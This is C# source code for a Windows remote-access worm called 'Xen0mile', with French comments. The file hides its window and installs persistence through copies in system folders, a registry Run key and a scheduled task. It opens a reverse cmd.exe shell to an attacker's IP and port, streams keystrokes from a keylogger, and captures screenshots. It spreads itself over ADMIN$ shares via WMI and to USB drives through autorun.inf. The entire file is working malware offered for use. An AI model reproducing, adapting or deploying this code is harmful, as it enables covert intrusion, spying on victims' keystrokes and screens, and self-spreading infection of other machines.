using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Management;
using System.Text;
using System.Threading;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

class Program
{
    [DllImport("user32.dll")]
    static extern short GetAsyncKeyState(int vKey);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0; 

    static void Main()
    {
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);

        AddPersistence();
        MonitorNetworkAndUSB();

        string ip = "YOUR IP"; // IP
        int port = YOUR PORT; // Port Netcat

        StartReverseShell(ip, port);
    }

    static void StartReverseShell(string ip, int port)
    {
        while (true)
        {
            try
            {
                using (TcpClient client = new TcpClient(ip, port))
                using (NetworkStream stream = client.GetStream())
                using (StreamReader reader = new StreamReader(stream))
                using (StreamWriter writer = new StreamWriter(stream))
                {
                    writer.AutoFlush = true;
                    writer.WriteLine("[*] Connection Established");

                    Process proc = new Process();
                    proc.StartInfo.FileName = "cmd.exe";
                    proc.StartInfo.RedirectStandardInput = true;
                    proc.StartInfo.RedirectStandardOutput = true;
                    proc.StartInfo.RedirectStandardError = true;
                    proc.StartInfo.UseShellExecute = false;
                    proc.StartInfo.CreateNoWindow = true;

                    proc.OutputDataReceived += (sender, args) => writer.WriteLine(args.Data);
                    proc.ErrorDataReceived += (sender, args) => writer.WriteLine(args.Data);

                    proc.Start();
                    proc.BeginOutputReadLine();
                    proc.BeginErrorReadLine();

                    Thread keyloggerThread = new Thread(() => StartKeylogger(writer));
                    keyloggerThread.Start();

                    string command;
                    while ((command = reader.ReadLine()) != null)
                    {
                        if (command.ToLower() == ".screenstream")
                        {
                            CaptureScreen(writer);
                        }
                        else if (command.ToLower() == ".keylog")
                        {
                            writer.WriteLine("[*] Keylogger Activated");
                        }
                        else
                        {
                            proc.StandardInput.WriteLine(command);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Error in reverse shell: " + ex.Message);
                Thread.Sleep(5000); 
            }
        }
    }

    static void CaptureScreen(StreamWriter writer)
    {
        try
        {
            string tempFile = Path.GetTempFileName() + ".png";
            Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics gfx = Graphics.FromImage(screenshot);
            gfx.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
            screenshot.Save(tempFile, ImageFormat.Png);
            writer.WriteLine("[*] Screenshot saved at: " + tempFile);
        }
        catch (Exception ex)
        {
            writer.WriteLine("[!] Screenshot failed: " + ex.Message);
        }
    }

    static void StartKeylogger(StreamWriter writer)
    {
        while (true)
        {
            try
            {
                for (int key = 0; key < 255; key++)
                {
                    if (GetAsyncKeyState(key) == -32767)
                    {
                        writer.Write((Keys)key + " ");
                    }
                }
            }
            catch (Exception ex)
            {
                writer.WriteLine("[!] Keylogger Error: " + ex.Message);
            }
            Thread.Sleep(10);
        }
    }

    static void AddPersistence()
    {
        try
        {
            string exePath = Process.GetCurrentProcess().MainModule.FileName;

            string[] systemFolders = new string[]
            {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "Xen0mile.exe"), // C:\Windows\System32\
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Xen0mile.exe"), // C:\Users\<user>\AppData\Roaming\
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Xen0mile.exe"), // C:\ProgramData\
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Xen0mile.exe") // C:\Program Files\
            };

            foreach (string folder in systemFolders)
            {
                if (!File.Exists(folder))
                {
                    File.Copy(exePath, folder);
                }
            }

            // Sélectionner une des copies pour la persistance
            string persistencePath = systemFolders[new Random().Next(systemFolders.Length)];

            // Ajout au registre pour la persistance au démarrage
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            key.SetValue("Xen0mile", persistencePath);  // Nom mis à jour ici

            // Ajouter une tâche planifiée pour garantir la persistance
            CreateScheduledTask(persistencePath);
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] Persistence error: " + ex.Message);
        }
    }

    static void CreateScheduledTask(string exePath)
    {
        try
        {
            // Crée une tâche planifiée pour garantir la persistance
            Process.Start("schtasks", $"/create /tn \"Xen0mile\" /tr \"{exePath}\" /sc ONSTART /f");  // Nom mis à jour ici
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] Scheduled task error: " + ex.Message);
        }
    }

    static void MonitorNetworkAndUSB()
    {
        Thread networkThread = new Thread(() =>
        {
            while (true)
            {
                try
                {
                    Propagate();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] Error in network monitoring: " + ex.Message);
                }
                Thread.Sleep(1000); // Réessayer toutes les secondes
            }
        });

        Thread usbThread = new Thread(() =>
        {
            while (true)
            {
                try
                {
                    PropagateViaUSB();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] Error in USB monitoring: " + ex.Message);
                }
                Thread.Sleep(1000); // Vérifier chaque seconde
            }
        });

        networkThread.Start();
        usbThread.Start();
    }

    static void Propagate()
    {
        try
        {
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            string[] ips = GetNetworkComputers();

            foreach (string ip in ips)
            {
                try
                {
                    CopyAndExecute(ip, exePath);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] Error propagating to " + ip + ": " + ex.Message);
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] Network propagation error: " + ex.Message);
        }
    }

    static string[] GetNetworkComputers()
    {
        try
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem");
            ManagementObjectCollection collection = searcher.Get();
            string[] machines = new string[collection.Count];
            int i = 0;

            foreach (ManagementObject obj in collection)
            {
                machines[i++] = obj["Name"].ToString();
            }

            return machines;
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] Error getting network computers: " + ex.Message);
            return new string[0];
        }
    }

    static void CopyAndExecute(string target, string exePath)
    {
        try
        {
            string remotePath = $"\\\\{target}\\ADMIN$\\system32\\Xen0mile.exe";
            File.Copy(exePath, remotePath, true);

            ManagementScope scope = new ManagementScope($"\\\\{target}\\root\\cimv2");
            scope.Connect();

            ManagementClass processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), null);
            ManagementBaseObject methodParams = processClass.GetMethodParameters("Create");
            methodParams["CommandLine"] = remotePath;
            processClass.InvokeMethod("Create", methodParams, null);
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] Error executing remote process: " + ex.Message);
        }
    }

    static void PropagateViaUSB()
    {
        try
        {
            string usbDrive = GetUSBDrive();
            if (!string.IsNullOrEmpty(usbDrive))
            {
                string exePath = Process.GetCurrentProcess().MainModule.FileName;
                string autorunPath = Path.Combine(usbDrive, "autorun.inf");
                string fileName = Path.GetFileName(exePath);
                File.Copy(exePath, Path.Combine(usbDrive, fileName), true);

                using (StreamWriter sw = new StreamWriter(autorunPath))
                {
                    sw.WriteLine("[autorun]");
                    sw.WriteLine("open=" + fileName);
                    sw.WriteLine("action=Start My Program");
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] Error propagating via USB: " + ex.Message);
        }
    }

    static string GetUSBDrive()
    {
        try
        {
            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                if (drive.IsReady && drive.DriveType == DriveType.Removable)
                {
                    return drive.RootDirectory.FullName;
                }
            }
            return null;
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] Error detecting USB drive: " + ex.Message);
            return null;
        }
    }
}
